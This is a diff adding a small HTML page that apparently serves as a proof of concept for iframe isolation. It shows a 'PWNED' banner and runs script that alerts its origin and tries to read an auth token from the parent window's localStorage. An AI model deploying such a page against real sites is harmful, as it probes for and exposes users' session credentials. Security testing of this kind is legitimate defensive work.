@@ -1,0 +1,9 @@
+<!doctype html>
+<html><body>
+<h1 style="background:red;color:#fff;padding:20px">PWNED</h1>
+<script>
+  alert('iframe origin: ' + location.origin);
+  try { alert('parent token: ' + top.localStorage.getItem('auth-2020-0')); }
+  catch (e) { alert('HOLA: ' + e.message); }
+</script>
+</body></html>
